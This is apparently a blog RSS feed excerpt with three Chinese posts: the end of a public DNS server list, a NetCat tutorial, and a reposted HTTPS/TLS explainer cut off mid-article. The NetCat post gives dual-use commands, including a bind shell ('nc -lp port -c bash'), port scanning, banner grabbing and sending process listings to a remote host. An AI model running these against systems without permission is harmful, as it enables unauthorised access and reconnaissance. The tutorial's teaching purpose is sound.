<td>KT olleh DNS</td>
<td>168.126.63.1</td>
<td>168.126.63.2</td>
</tr>
<tr>
<td>SK Broadband DNS</td>
<td>210.220.163.82</td>
<td>219.250.36.130</td>
</tr>
<tr>
<td>LG U+ DNS</td>
<td>164.124.101.2</td>
<td>203.248.252.2</td>
</tr>
<tr>
<td></td>
<td>164.124.107.9</td>
<td>203.248.242.2</td>
</tr>
</tbody>
</table>
<h3 id="美国">美国</h3>
<table>
<thead>
<tr>
<th>名称</th>
<th>IP 地址（首选）</th>
<th>IP 地址（备选）</th>
</tr>
</thead>
<tbody>
<tr>
<td>Cloudflare DNS</td>
<td>1.1.1.1</td>
<td>1.0.0.1</td>
</tr>
<tr>
<td>Google DNS</td>
<td>8.8.8.8</td>
<td>8.8.4.4</td>
</tr>
<tr>
<td>IBM Quad9</td>
<td>9.9.9.9</td>
<td>149.112.112.112</td>
</tr>
<tr>
<td>DNS.SB</td>
<td>185.222.222.222</td>
<td>185.184.222.222</td>
</tr>
<tr>
<td>OpenDNS</td>
<td>208.67.222.222</td>
<td>208.67.220.220</td>
</tr>
<tr>
<td>V2EX DNS</td>
<td>199.91.73.222</td>
<td>178.79.131.110</td>
</tr>
<tr>
<td>HE Public DNS</td>
<td>74.82.42.42</td>
<td>66.220.18.42</td>
</tr>
</tbody>
</table>
<h3 id="其他地区">其他地区</h3>
<table>
<thead>
<tr>
<th>名称</th>
<th>IP 地址（首选）</th>
<th>IP 地址（备选）</th>
</tr>
</thead>
<tbody>
<tr>
<td>俄罗斯 Yandex Public DNS</td>
<td>77.88.8.8</td>
<td>77.88.8.1</td>
</tr>
<tr>
<td>俄罗斯 SafeDNS</td>
<td>195.46.39.39</td>
<td>195.46.39.40</td>
</tr>
<tr>
<td>德国 DNS.WATCH Public DNS</td>
<td>84.200.69.80</td>
<td>84.200.70.40</td>
</tr>
<tr>
<td>瑞士 xiala.net Public DNS</td>
<td>77.109.148.136</td>
<td>77.109.148.137</td>
</tr>
<tr>
<td>丹麦 UncensoredDNS</td>
<td>91.239.100.100</td>
<td>89.233.43.71</td>
</tr>
<tr>
<td>荷兰 Freenom World Public DNS</td>
<td>80.80.80.80</td>
<td>80.80.81.81</td>
</tr>
</tbody>
</table>
<h2 id="ipv6">IPv6</h2>
<h3 id="国内-1">国内</h3>
<table>
<thead>
<tr>
<th>名称</th>
<th>IP 地址（首选）</th>
<th>IP 地址（备选）</th>
</tr>
</thead>
<tbody>
<tr>
<td>百度</td>
<td>2400:da00::6666</td>
<td></td>
</tr>
<tr>
<td>阿里</td>
<td>2400:3200::1</td>
<td>2400:3200:baba::1</td>
</tr>
<tr>
<td>CNNIC</td>
<td>2001:dc7:1000::1</td>
<td></td>
</tr>
<tr>
<td>下一代互联网北京研究中心</td>
<td>240C::6666</td>
<td>240C::6644</td>
</tr>
</tbody>
</table>
<h4 id="高校">高校</h4>
<table>
<thead>
<tr>
<th>名称</th>
<th>IP 地址（首选）</th>
<th>IP 地址（备选）</th>
</tr>
</thead>
<tbody>
<tr>
<td>北京邮电大学</td>
<td>2001:da8:202:10::36</td>
<td>2001:da8:202:10::37</td>
</tr>
<tr>
<td>上海交通大学</td>
<td>2001:da8:8000:1:202:120:2:100</td>
<td>2001:da8:8000:1:202:120:2:101</td>
</tr>
<tr>
<td>中科院网络信息中心</td>
<td>2001:cc0:2fff:1::6666</td>
<td></td>
</tr>
<tr>
<td>北京交通大学</td>
<td>2001:da8:205:2060::188</td>
<td></td>
</tr>
<tr>
<td>清华大学</td>
<td>2001:da8:ff:305:20c:29ff:fe1f:a92a</td>
<td></td>
</tr>
<tr>
<td>清华大学 TUNA 协会</td>
<td>2001:da8::666</td>
<td></td>
</tr>
<tr>
<td>北京科技大学</td>
<td>2001:da8:208:10::6</td>
<td></td>
</tr>
</tbody>
</table>
<h3 id="台湾地区-1">台湾地区</h3>
<table>
<thead>
<tr>
<th>名称</th>
<th>IP 地址（首选）</th>
<th>IP 地址（备选）</th>
</tr>
</thead>
<tbody>
<tr>
<td>中华电信</td>
<td>2001:b000:168::1</td>
<td>2001:b000:168::2</td>
</tr>
<tr>
<td>台湾网路资讯</td>
<td>2001:de4::101</td>
<td>2001:de4::102</td>
</tr>
</tbody>
</table>
<h3 id="美国-1">美国</h3>
<table>
<thead>
<tr>
<th>名称</th>
<th>IP 地址（首选）</th>
<th>IP 地址（备选）</th>
</tr>
</thead>
<tbody>
<tr>
<td>GOOGLE</td>
<td>2001:4860:4860::8888</td>
<td>2001:4860:4860::8844</td>
</tr>
<tr>
<td>CloudFlare DNS</td>
<td>2606:4700:4700::1111</td>
<td>2606:4700:4700::1001</td>
</tr>
<tr>
<td>IBM</td>
<td>2620:fe::fe</td>
<td>2620:fe::9</td>
</tr>
<tr>
<td>Cisco OpenDNS</td>
<td>2620:0:ccc::2</td>
<td>2620:0:ccd::2</td>
</tr>
<tr>
<td>HE Public DNS</td>
<td>2001:470:20::2</td>
<td>2001:470:0:9d::2</td>
</tr>
<tr>
<td>Verisign Public DNS</td>
<td>2620:74:1b::1:1</td>
<td>2620:74:1c::2:2</td>
</tr>
<tr>
<td>Neustar Recursive DNS</td>
<td>2610:a1:1018::1</td>
<td>2610:a1:1019::1</td>
</tr>
</tbody>
</table>
<h3 id="其他地区-1">其他地区</h3>
<table>
<thead>
<tr>
<th>名称</th>
<th>IP 地址（首选）</th>
<th>IP 地址（备选）</th>
</tr>
</thead>
<tbody>
<tr>
<td>俄罗斯 Yandex Public DNS</td>
<td>2a02:6b8::feed:0ff</td>
<td>2a02:6b8:0:1::feed:0ff</td>
</tr>
<tr>
<td>德国 DNS.WATCH Public DNS</td>
<td>2001:1608:10:25::1c04:b12f</td>
<td>2001:1608:10:25::9249:d69b</td>
</tr>
<tr>
<td>瑞士 xiala.net Public DNS</td>
<td>2001:1620:2078:136::</td>
<td>2001:1620:2078:137::</td>
</tr>
<tr>
<td>丹麦 UncensoredDNS</td>
<td>2001:67c:28a4::</td>
<td>2a01:3a0:53:53::</td>
</tr>
</tbody>
</table>
<h2 id="参考">参考</h2>
<ul>
<li>
<p>[1] <a href="https://www.iplaysoft.com/public-dns.html" target="_blank" rel="noopener noreffer">全球免费公共 dns 解析服务器 ip 地址列表推荐 (解决无法上网/加速/防劫持)</a></p>
</li>
<li>
<p>[2] <a href="http://ip.cn/dns.html" target="_blank" rel="noopener noreffer">公共 dns 服务器 ip 地址</a></p>
</li>
</ul>]]></description>
</item><item>
    <title>网络分析工具：NetCat</title>
    <link>https://www.techkoala.top/netcat/</link>
    <pubDate>Wed, 19 Aug 2020 23:15:35 &#43;0800</pubDate>
    <author>作者</author>
    <guid>https://www.techkoala.top/netcat/</guid>
    <description><![CDATA[<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Network/NetCat/netcat.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Network/NetCat/netcat.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Network/NetCat/netcat.webp" data-sub-html="<h2>网络瑞士军刀 —— NetCat</h2>">
        
    </a><figcaption class="image-caption">网络瑞士军刀 —— NetCat</figcaption>
    </figure>
<h2 id="什么是-netcat">什么是 NetCat</h2>
<p>简单来说，NetCat (nc) 是一个命令行工具，能够让你很方便、很灵活地操纵 <code>传输层协议</code>（TCP ＆ UDP）</p>
<p>nc 可以在两台设备上面相互交互，即<code>侦听模式</code>/<code>传输模式</code></p>
<p>nc 包含以下主要功能：</p>
<ul>
<li>Telnet 功能</li>
<li>获取 banner 信息</li>
<li>传输文本信息</li>
<li>传输文件 / 目录</li>
<li>加密传输文件，默认不加密</li>
<li>远程控制</li>
<li>加密所有流量</li>
<li>流媒体服务器</li>
<li>远程克隆硬盘</li>
</ul>
<h2 id="使用-netcat">使用 NetCat</h2>
<p>一般来说，nc 的命令行包括如下几个部分：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">nc 命令选项 主机 端口
</code></pre></td></tr></table>
</div>
</div><h3 id="命令选项">命令选项</h3>
<blockquote>
<p>本文内容基于 OpenBSD 社区的变种（也叫 OpenBSD netcat，部分命令与原版有差异。 ）</p>
</blockquote>
<p>下面列举了一些常用选项，更多选项参见 <a href="https://man.openbsd.org/nc.1" target="_blank" rel="noopener noreffer">OpenBSD manual page</a></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">选项	   是否有 “选项值”	   说明
-h	   NO	           输出 nc 的帮助
-v	   NO	           在网络通讯时，显示详细的输出信息
-n	   NO	           对命令行中的主机，不进行域名解析，如果主机是 IP 地址，需要用该选项
-p	  YES	           指定端口号
-l	  NO	           开启监听模式，nc 作为服务端，如不加，nc 默认作为客户端
-u	  NO	           使用 UDP 协，如不加该选项，默认是 TCP 协议
-w	  YES	           设置连接的超时间隔（N 秒）
-q	  YES	           让 nc 延时（N 秒）再退出
-z	  NO	           开启 zero-I/O 模式，该选项仅用于端口扫描
-k	  NO	           配合 -l 选项使用，可以重复接受客户端连接
-X	  YES	           指定代理的类型
-x	  YES	           以 IP:port 的格式指定代理
-d    NO               后台模式
</code></pre></td></tr></table>
</div>
</div><h3 id="主机">主机</h3>
<p>这部分可以没有，可以以 <code>IP 地址</code> 形式表示，也可以以 <code>域名</code> 形式表示。</p>
<h3 id="端口">端口</h3>
<p>这部分可以没有，可以是单个端口，可以是端口范围。</p>
<h2 id="常用使用场景示例">常用使用场景示例</h2>
<h3 id="测试某个远程主机的监听端口是否可达">测试某个远程主机的监听端口是否可达</h3>
<p>经常有这种需求，要判断某个主机的监听端口是否能连上。导致监听端口无法连接，通常有两种原因：</p>
<ol>
<li>监听端口没开启</li>
<li>监听端口虽然开启，但是被防火墙阻拦了</li>
</ol>
<p>对第 1 个原因，（如果你能在该主机上运行命令）可以直接用 <code>netstat</code> 这个命令查看监听端口是否开启；但对于第 2 个原因，<code>netstat</code> 就用不上了，这时候就可以用 nc 来帮你搞定。</p>
<p>用如下命令可以测试某个 IP 地址上的某个监听端口是否开启:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">nc -nv ip port
</code></pre></td></tr></table>
</div>
</div><p><strong>注：</strong>　默认情况下 nc 会等待很久，然后才告诉你连接失败。如果你所处的网络环境稳定且高速（比如：局域网内），那么，你可以追加 <code>-w</code> 选项，设置一个比较小的超时值。在下面的例子中，超时值设为 3 秒。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">nc -nv -w <span class="m">3</span> ip port
</code></pre></td></tr></table>
</div>
</div><h3 id="判断防火墙是否允许-or-禁止某个端口">判断防火墙是否允许 or 禁止某个端口</h3>
<p>假设你正在配置防火墙规则，禁止 TCP 的 8080 端口对外监听。那么，你如何验证自己的配置生效？</p>
<p>为了叙述方便，设想如下场景：
有两台主机 ——<code>主机 C</code> 充当客户端，<code>主机 S</code> 充当服务端。
然后要判断<code>主机 S</code> 上的防火墙是否会拦截其它主机对 8080 TCP 端口的连接。</p>
<p>在<code>主机 S</code> 上运行 nc，让它在 8080 端口，命令如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">nc -lv -p <span class="m">8080</span>
</code></pre></td></tr></table>
</div>
</div><p>然后在 “主机 C” 上运行 nc，测试 “主机 S” 上的 8080 端口是否可达</p>
<p><strong>注：</strong>　在默认情况下，nc 开启 listen 模式充当服务端，在接受<strong>第一次</strong>客户端连接之后，就会把监听端口关闭。如果你想要让 nc 始终监听模式，使之能<strong>重复</strong>接受客户端发起的连接，可以追加 <code>-k</code> 选项。</p>
<h3 id="端口扫描">端口扫描</h3>
<p>下面这个命令，用来扫描的端口范围从 1 到 1024</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">nc -znv ip 1-1024
</code></pre></td></tr></table>
</div>
</div><p>选项 -z
是指开启 <code>zero-I/O 模式</code>。该模式 nc 只判断某个监听端口是否能连上，连上后<strong>不</strong>与对端进行数据通讯。</p>
<p>**注：**端口扫描的时候，<code>-v</code> 选项会把成功/失败的结果统统打印出来。通常关注的都是 “扫描成功” 的那些端口。因此，可以用可以配合使用 <code>grep</code> 过滤一下，只打印扫出来的端口</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">nc -znv ip 1-1024  2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> grep succeeded
</code></pre></td></tr></table>
</div>
</div><p>此外，由于 <code>-v</code> 选项产生的输出位于 <code>stderr</code>，上述命令中的 <code>2&gt;&amp;1</code> 用来把 <code>stderr</code> 合并到 <code>stdout</code>。</p>
<p><strong>另：</strong> nc 默认超时较大，导致扫描速度较慢。建议根据网络情况合理设置超时值，加快扫描速度。</p>
<h3 id="探测服务器类型和软件版本">探测服务器类型和软件版本</h3>
<p>如果某个服务器运行了 SSH 服务端，那么用如下命令可以看出：该服务器的操作系统类型，以及 SSH server 的版本。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell"><span class="nb">echo</span> <span class="s2">&#34;EXIT&#34;</span> <span class="p">|</span> nc -vq <span class="m">5</span> -n ip <span class="m">22</span>
OR
<span class="nb">echo</span> <span class="s2">&#34;EXIT&#34;</span> <span class="p">|</span> nc -vq <span class="m">5</span> domain <span class="m">22</span>
</code></pre></td></tr></table>
</div>
</div><h3 id="端口转发">端口转发</h3>
<p>用 nc 进行端口转发，需要运行两个 nc 进程，一个充当<code>服务端</code>，另一个是<code>客户端</code>，然后用管道让把两个进程的<code>标准输入输出``交叉配对</code>。所谓的<code>交叉配对</code>就是——每一个 nc 进程的<code>标准输出</code>都对接到另一个 nc 进程的<code>标准输入</code>。如此一来，就可以完美地建立双向通讯。</p>
<p>步骤 1：创建命名管道</p>
<p>用下面这个简单的命令创建一个 “命名管道”，其名称叫做 nc_pipe</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">mkfifo nc_pipe
</code></pre></td></tr></table>
</div>
</div><p>步骤 2：同时启动两个 nc</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">nc -l -p <span class="m">1234</span> &lt; nc_pipe <span class="p">|</span> nc 127.0.0.1 <span class="m">5678</span> &gt; nc_pipe
</code></pre></td></tr></table>
</div>
</div><p>运行上述命令之后，就可以把本机的 1235 端口重定向到本机的 5678 端口。</p>
<h3 id="传输文件">传输文件</h3>
<p>为了叙述方便，假设你有两台主机 A 与 B，你要把 A 主机上的文件 file1 传输到 B 主机上，保存为 file2</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">先在接收端 B 主机运行如下命令
nc -l -p port &gt; file2

然后在发送端 A 主机运行如下命令
nc ip port &lt; file1
</code></pre></td></tr></table>
</div>
</div><p>两者端口号要相同</p>
<h3 id="远程备份整个磁盘">远程备份整个磁盘</h3>
<p>假设你要把 A 主机 <code>/dev/sda</code> 磁盘的原始数据整个复制到 B 主机的 <code>/dev/sdb</code> 磁盘。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">先在接收端（B 主机）运行如下命令
nc -lp port <span class="p">|</span> dd <span class="nv">of</span><span class="o">=</span>/dev/sdb

然后在发送端 A 主机运行如下命令
dd <span class="k">if</span><span class="o">=</span>/dev/sda <span class="p">|</span> nc ip port
</code></pre></td></tr></table>
</div>
</div><h3 id="远程控制">远程控制</h3>
<p>将 A 主机的 <code>bash</code> 发给 B 主机</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">A:
nc -lp port -c bash

B:
nc ip port
</code></pre></td></tr></table>
</div>
</div><h3 id="流媒体服务">流媒体服务</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">A:
cat test.mp4 <span class="p">|</span> nc -lp port

B:
nc -nv ip port <span class="p">|</span> mplayer -vo x11 -cache <span class="m">4000</span>
</code></pre></td></tr></table>
</div>
</div><p>A 让 test.MP4 这个文件成为<code>流</code>的形式发送到 B，B 用 mplayer 播放，接收多少播放多少，指定缓存 4000bytes。</p>
<h3 id="信息收集">信息收集</h3>
<p>收集目标机上的进程信息</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">nc -l -p port &gt; ps.txt
将远程发送过来的内容保存在本地

Ps aux <span class="p">|</span>nc -nv ip port -q <span class="m">1</span>
标准输入完成后 delay 一秒钟，会发送到侦听端

</code></pre></td></tr></table>
</div>
</div><h2 id="参考">参考</h2>
<ul>
<li>
<p>[1] <a href="https://man.openbsd.org/nc.1" target="_blank" rel="noopener noreffer">netcat manual page</a></p>
</li>
<li>
<p>[2] <a href="https://program-think.blogspot.com/2019/09/Netcat-Tricks.html#head-15" target="_blank" rel="noopener noreffer">扫盲 netcat（网猫）的 N 种用法 —— 从 “网络诊断” 到 “系统入侵”</a></p>
</li>
<li>
<p>[3] <a href="https://www.jianshu.com/p/cb26a0f6c622" target="_blank" rel="noopener noreffer">NetCat 使用指南</a></p>
</li>
</ul>]]></description>
</item><item>
    <title>HTTPS 工作原理</title>
    <link>https://www.techkoala.top/how_https_works/</link>
    <pubDate>Sun, 16 Aug 2020 21:52:26 &#43;0800</pubDate>
    <author>作者</author>
    <guid>https://www.techkoala.top/how_https_works/</guid>
    <description><![CDATA[<blockquote>
<p>理解 HTTP 协议，对称和非对称加密，了解 HTTPS 协议的工作原理</p>
</blockquote>
<blockquote>
<p>注：本文系全文转载，原文信息如下：</p>
<p>作者：猫尾博客</p>
<p>链接：https://cattail.me/tech/2015/11/30/how-https-works.html</p>
<p>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
</blockquote>
<p>读完本文，你能明白</p>
<ul>
<li>什么是 HTTPS，TLS (SSL)，TLS 和 HTTPS 是什么关系</li>
<li>什么是证书和数字签名，它们是如何传递信任的</li>
<li>HTTPS 有什么样的功能，它是如何实现这样的功能的</li>
</ul>
<h2 id="简介">简介</h2>
<p>HTTPS，也称作 HTTP over TLS。TLS 的前身是 SSL，TLS 1.0 通常被标示为 SSL 3.1，TLS 1.1 为 SSL 3.2，TLS 1.2 为 SSL 3.3。本文着重描述 TLS 协议的 1.2 版本</p>
<p>下图描述了在 TCP/IP 协议栈中 TLS (各子协议）和 HTTP 的关系</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Network/HTTPS/tcp-ip-model.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Network/HTTPS/tcp-ip-model.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Network/HTTPS/tcp-ip-model.webp" data-sub-html="<h2>Credit: Kaushal Kumar Panday From: SSL Handshake and HTTPS Bindings on IIS</h2>">
        
    </a><figcaption class="image-caption">Credit: <a href="https://blogs.msdn.com/213737/ProfileUrlRedirect.ashx" target="_blank" rel="noopener noreffer">Kaushal Kumar Panday</a> From: <a href="https://blogs.msdn.com/b/kaushal/archive/2013/08/03/ssl-handshake-and-https-bindings-on-iis.aspx" target="_blank" rel="noopener noreffer">SSL Handshake and HTTPS Bindings on IIS</a></figcaption>
    </figure>
<p>其中 <code>Handshake protocol</code>，<code>Change Ciper Spec protocol</code> 和 <code>Alert protocol</code> 组成了 <code>SSL Handshaking Protocols</code>。</p>
<p>HTTPS 和 HTTP 协议相比提供了:</p>
<ol>
<li>数据完整性：内容传输经过完整性校验</li>
<li>数据隐私性：内容经过对称加密，每个连接生成一个唯一的加密密钥</li>
<li>身份认证：第三方无法伪造服务端（客户端）身份</li>
</ol>
<p>其中，数据完整性和隐私性由 TLS Record Protocol 保证，身份认证由 TLS Handshaking Protocols 实现。</p>
<h2 id="总览">总览</h2>
<p>使用 RSA 算法的 SSL 握手过程是这样的:</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Network/HTTPS/ssl_handshake_rsa.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Network/HTTPS/ssl_handshake_rsa.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Network/HTTPS/ssl_handshake_rsa.webp" data-sub-html="<h2>Source: Keyless SSL: The Nitty Gritty Technical Details</h2>">
        
    </a><figcaption class="image-caption">Source: <a href="https://blog.cloudflare.com/keyless-ssl-the-nitty-gritty-technical-details/" target="_blank" rel="noopener noreffer">Keyless SSL: The Nitty Gritty Technical Details</a></figcaption>
    </figure>
<ol>
<li>[明文] 客户端发送随机数 client_random 和支持的加密方式列表</li>
<li>[明文] 服务器返回随机数 server_random ，选择的加密方式和服务器证书链</li>
<li>[RSA] 客户端验证服务器证书，使用证书中的公钥加密 premaster secret 发送给服务端</li>
<li>服务端使用私钥解密 premaster secret</li>
<li>两端分别通过 client_random，server_random 和 premaster secret 生成 master secret，用于对称加密后续通信内容</li>
</ol>
<h3 id="证书digital-certificate">证书（Digital certificate）</h3>
<p>那么什么是证书呢？</p>
<figure><a class="lightgallery" href="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Network/HTTPS/certificate.webp" title="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Network/HTTPS/certificate.webp" data-thumbnail="https://cdn.jsdelivr.net/gh/techkoala/techkoala.github.io@master/images/Network/HTTPS/certificate.webp" data-sub-html="<h2>证书信息</h2>">
        
    </a><figcaption class="image-caption">证书信息</figcaption>
    </figure>
<h3 id="证书中包含了以下信息">证书中包含了以下信息</h3>
<ol>
<li>证书信息：过期时间和序列号</li>
<li>所有者信息：姓名等</li>
<li>所有者公钥</li>
</ol>
<p><strong>为什么服务端要发送证书给客户端?</strong></p>
<p>互联网有太多的服务需要使用证书来验证身份，以至于客户端（操作系统或浏览器等）无法内置所有证书，需要通过服务端将证书发送给客户端。</p>
<h3 id="客户端为什么要验证接收到的证书">客户端为什么要验证接收到的证书</h3>
<p><strong>中间人攻击</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">客户端 &lt;------------ 攻击者 &lt;------------ 服务端
        伪造证书            拦截请求
</code></pre></td></tr></table>
</div>
</div><h3 id="客户端如何验证接收到的证书">客户端如何验证接收到的证书</h3>
<p>为了回答这个问题，需要引入<code>数字签名</code> (Digital Signature)。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">+---------------------+
| A digital signature |
|(not to be confused  |
|with a digital       |
|certificate)         |              +---------+                +--------+
| is a mathematical   |---- 哈希 ---&gt;| 消息摘要  |--- 私钥加密 ---&gt;| 数字签名 |
|technique used       |              +---------+                +--------+
|to validate the      |
|authenticity and     |
|integrity of a       |
|message, software    |
|or digital document. |
+---------------------+
</code></pre></td></tr></table>
</div>
</div><p>将一段文本通过哈希（hash）和私钥加密处理后生成数字签名。</p>
<p>假设消息传递在 Bob，Susan 和 Pat 三人之间发生。Susan 将消息连同数字签名一起发送给 Bob，Bob 接收到消息后，可以这样验证接收到的消息就是 Susan 发送的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">+---------------------+
| A digital signature |
|(not to be confused  |
|with a digital       |
|certificate)         |              +---------+
| is a mathematical   |---- 哈希 ---&gt;|  消息摘要 |
|technique used       |              +---------+
|to validate the      |                 |
|authenticity and     |                 |
|integrity of a       |                 |
|message, software    |                 对
|or digital document. |                 比
+---------------------+                 |
                                        |
                                        |
        +---------+               +----------+
        | 数字签名 |--- 公钥解密 ---&gt;|  消息摘要 |
        +---------+               +----------+
</code></pre></td></tr></table>
</div>
</div><p>当然，这个前提是 Bob 知道 Susan 的公钥。更重要的是，和消息本身一样，公钥不能在不安全的网络中直接发送给 Bob。</p>
<p>此时就引入了<a href="https://en.wikipedia.org/wiki/Certificate_authority" target="_blank" rel="noopener noreffer">证书颁发机构</a>（Certificate Authority，简称 CA），CA 数量并不多，Bob 客户端内置了所有受信任 CA 的证书。CA 对 Susan 的公钥（和其他信息）数字签名后生成证书。</p>
<p>Susan 将证书发送给 Bob 后，Bob 通过 CA 证书的公钥验证证书签名。</p>
<p>Bob 信任 CA，CA 信任 Susan 使得 Bob 信任 Susan，信任链（Chain Of Trust）就是这样形成的。</p>
<p>事实上，Bob 客户端内置的是 CA 的根证书 (Root Certificate)，HTTPS 协议中服务器会发送证书链（Certificate Chain）给客户端。</p>
<h2 id="tls-协议">TLS 协议</h2>
<p>TLS 协议包括 TLS Record Protocol 和 TLS Handshake Protocol。总览中的流程图仅涉及到 TLS Handshake Protocol。</p>
<h3 id="tls-record-protocol">TLS Record Protocol</h3>
<p>在 TLS 协议中，有四种子协议运行于 Record protocol 之上</p>
<ul>
<li>Handshake protocol</li>
<li>Alert protocol</li>
<li>Change cipher spec protocol</li>
<li>Application data protocol</li>
</ul>
<p>Record protocol 起到了这样的作用</p>
<ul>
<li>在发送端：将数据（Record）分段，压缩，增加 MAC (Message Authentication Code) 和加密</li>
<li>在接收端：将数据（Record）解密，验证 MAC，解压并重组</li>
</ul>
<blockquote>
<p>值得一提的是，Record protocol 提供了数据完整性和隐私性保证，但 Record 类型（type）和长度（length）是公开传输的</p>
</blockquote>
<p>Record Protocol 有三个连接状态 (Connection State)，连接状态定义了压缩，加密和 MAC 算法。所有的 Record 都是被当前状态（Current State）确定的算法处理的。</p>
<p><code>TLS Handshake Protocol</code> 和 <code>Change Ciper Spec Protocol</code> 会导致 <code>Record Protocol</code> 状态切换。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
